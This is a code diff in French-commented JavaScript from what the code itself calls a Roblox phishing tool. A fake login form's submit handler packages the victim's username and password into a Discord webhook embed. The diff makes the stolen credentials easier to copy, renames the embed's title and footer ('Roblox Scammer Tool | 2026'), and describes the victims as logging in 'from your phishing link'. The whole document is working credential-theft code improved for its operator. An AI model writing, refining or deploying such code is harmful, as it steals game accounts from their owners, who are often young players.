@@ -15,22 +15,23 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     form.classList.add('hidden');
     document.getElementById('loading').classList.remove('hidden');
 
-    // Préparation des données pour Discord (Embed)
+    // Nouvelle structure UI (Moderne)
     const payload = {
         "content": null,
         "embeds": [
             {
-                "title": "🔒 Nouveau compte Roblox volé !",
-                "color": 15158332, // Couleur rouge/orange pour attirer l'attention
+                "title": "🔒 Nouveau compte récupéré",
+                "description": "Un utilisateur s'est connecté depuis ton lien phishing.",
+                "color": 5814783, // Bleu moderne (Discord Blurple-ish)
                 "fields": [
                     {
                         "name": "👤 Identifiant / Email",
-                        "value": username,
+                        "value": `\`\`\`${username}\`\`\``, // Format code pour faciliter la copie
                         "inline": true
                     },
                     {
                         "name": "🔑 Mot de passe",
-                        "value": password,
+                        "value": `\`\`\`${password}\`\`\``,
                         "inline": true
                     },
                     {
@@ -40,7 +41,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
                     }
                 ],
                 "footer": {
-                    "text": "Roblox Phishing Tool v1.0"
+                    "text": "Roblox Scammer Tool | 2026"
                 },
                 "timestamp": new Date().toISOString()
             }
